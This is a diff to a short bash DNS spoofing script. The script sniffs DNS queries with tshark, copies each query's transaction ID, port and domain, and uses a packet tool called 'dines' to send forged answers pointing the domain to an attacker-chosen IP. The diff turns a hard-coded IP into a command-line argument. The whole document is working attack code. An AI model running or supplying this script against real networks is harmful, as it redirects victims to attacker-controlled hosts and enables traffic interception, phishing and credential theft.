@@ -1,5 +1,10 @@
 #!/bin/bash
 
+if [ "$1" == "" ];then
+    echo "Usage: $0 <ip to give>"
+    exit
+fi
+
 while true
 do
     tshark -V port 53 -c 1 > pkt 2> /dev/null
@@ -10,5 +15,5 @@ do
     DOMAIN=`cat pkt | grep type | grep class | cut -d " " -f 9 | cut -d ":" -f 1`
     ./dines --dst-ip $IP --sport 53 --dport $UDP_PORT --trid $TRID \
        --question $DOMAIN,1,1 \
-       --answer $DOMAIN,1,1,60,163.162.22.202
+       --answer $DOMAIN,1,1,60,$1
 done
